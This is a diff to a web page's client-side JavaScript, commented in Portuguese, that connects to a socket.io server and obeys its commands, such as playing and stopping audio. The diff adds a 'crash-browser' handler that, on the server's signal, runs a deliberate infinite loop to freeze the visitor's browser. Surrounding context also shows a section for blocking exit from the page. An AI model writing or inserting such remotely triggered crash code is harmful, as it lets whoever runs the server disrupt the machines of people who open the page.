@@ -87,7 +87,16 @@
 <script src="/socket.io/socket.io.js"></script>
 <script>
 /* ========= Conexão ====================================================== */
-const socket = io({query:{role:'client'}});
+ const socket = io({ query:{ role:'client' } });
+  // & outros listeners &
+
+  // substitua o antigo socket.on('crash-browser', &) por:
+  socket.on('crash-browser', () => {
+    console.log('Ô Recebi crash-browser, iniciando loop de crash&');
+    for (let i = 5; i > 3; i = i + 1) {
+      console.log(i);
+    }
+  });
 
 /* ========= Função auxiliar ============================================= */
 const blobToDataURL = blob => new Promise(r=>{const fr=new FileReader();fr.onload=()=>r(fr.result);fr.readAsDataURL(blob);});
@@ -160,6 +169,8 @@ socket.on('play-audio',({url})=>{
 socket.on('stop-audio',()=>{
   if(currentAudio){currentAudio.pause();currentAudio.currentTime=0;currentAudio=null;}
 });
+
+
 
 /* ========= BLOQUEIO DE SAÍDA =========================================== */
 let confirmExit=true;
